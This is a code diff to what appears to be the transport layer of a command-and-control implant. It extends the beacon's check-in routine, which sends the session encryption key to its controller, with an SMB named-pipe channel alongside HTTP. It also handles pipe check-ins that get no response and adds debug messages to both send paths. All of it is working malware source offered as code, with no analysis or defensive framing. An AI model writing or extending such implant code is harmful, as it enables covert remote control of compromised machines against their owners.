@@ -111,6 +111,9 @@ auto DECLFN Transport::Checkin(
     // encryption key
     Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
 
+    // SMB pipe name (empty string for HTTP beacons)
+    Self->Pkg->Str( CheckinPkg, Self->Tsp->Pipe.Name ? Self->Tsp->Pipe.Name : (PCHAR)"" );
+
     //
     // send the packet
     //
@@ -121,7 +124,17 @@ auto DECLFN Transport::Checkin(
     KhDbg( "transmited return %p [%d bytes]", Data, Length );
 
     //
-    // parse response
+    // If no response data (SMB checkin — parent reads data, no response on pipe)
+    // just mark as connected and return.
+    //
+    if ( ! Data || ! Length ) {
+        Self->Session.Connected = TRUE;
+        Self->Ntdll.DbgPrint( "[SMB] Checkin sent, no response expected — marked as connected\n" );
+        return TRUE;
+    }
+
+    //
+    // HTTP checkin: parse response with new agent ID
     //
     Self->Psr->New( CheckinPsr, Data, Length );
     if ( ! CheckinPsr->Original ) return FALSE;
@@ -159,11 +172,13 @@ auto Transport::Send(
     _Out_opt_ MM_INFO* RecvData
 ) -> BOOL {
 #if PROFILE_C2 == PROFILE_HTTP
+    Self->Ntdll.DbgPrint( "[TRANSPORT] Send via HTTP\n" );
     return Self->Tsp->HttpSend(
         SendData, RecvData
     );
 #endif
 #if PROFILE_C2 == PROFILE_SMB
+    Self->Ntdll.DbgPrint( "[TRANSPORT] Send via SMB\n" );
     return Self->Tsp->SmbSend(
         SendData, RecvData
     );
